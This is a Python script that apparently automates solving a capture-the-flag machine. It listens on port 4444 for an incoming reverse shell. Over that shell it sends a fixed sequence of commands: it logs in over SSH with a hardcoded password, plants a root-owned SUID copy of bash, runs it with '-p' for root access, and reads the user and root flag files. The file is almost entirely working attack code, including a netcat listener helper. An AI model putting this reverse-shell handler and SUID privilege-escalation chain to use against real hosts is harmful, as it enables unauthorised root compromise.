import socket
import sys
import threading
import time
import subprocess
import signal

commands = ["cd /home/augustus", "script /dev/null bash", "ssh augustus@172.19.0.1", "yes", "superadministrator",
            "cp /bin/bash .", "exit", "chown root:root bash", "chmod 4755 bash", "script /dev/null bash",
            "ssh augustus@172.19.0.1", "superadministrator", "./bash -p", "cat user.txt", "cat /root/root.txt"]


def read_socket(client):
    while True:
        output = client.recv(1024).decode("utf-8")
        print(output, end="")


def write_socket(client):
    for cmd in commands[:-2]:
        client.send((cmd + "\n").encode())
        time.sleep(0.5)

    client.send((commands[-2] + "\n").encode())
    user_flag = client.recv(5000)

    client.send((commands[-1] + "\n").encode())
    root_flag = client.recv(5000)
    print("[+] User Flag:")
    print(user_flag.decode())

    print("[+] Root Flag:")
    print(root_flag.decode())

    client.close()


def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("10.10.14.4", 4444))
    listener.listen()

    client, addr = listener.accept()

    print(f"[+] Got connection from: {addr}")

    read_thread = threading.Thread(target=read_socket, args=(client,))
    read_thread.start()

    write_thread = threading.Thread(target=write_socket, args=(client,))
    write_thread.start()


def manual_netcat_listener():
    
    process = subprocess.Popen("ncat -lvp 4444", shell=True)
    
    try:
        print("Listener running, Ctrl+C to exit")
        process.wait()
    except KeyboardInterrupt:
        print("Exiting...")
        process.send_signal(signal.SIGINT) # send Ctrl+C equivalent
        print('\n')

